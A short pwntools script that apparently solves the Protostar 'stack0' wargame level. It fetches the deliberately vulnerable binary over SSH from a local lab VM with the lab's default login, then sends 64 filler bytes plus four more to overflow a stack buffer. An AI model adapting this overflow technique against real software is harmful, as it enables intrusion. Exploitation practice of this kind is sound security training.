import os, sys, subprocess
from pwn import *

context(arch='i386', os='linux')

shell = ssh(host='192.168.94.129', user='user', password='user', port=22)
shell.download_file('/opt/protostar/bin/stack0', './bin/stack0')
if not os.access('./bin/stack0', os.X_OK):
    subprocess.call('chmod +x ./bin/stack0', shell=True)

p = process('./bin/stack0')

junk = 'A'*cyclic_find(0x61616171) # 64
junk += 'B'*4
p.sendline(junk)
log.info(p.recv())

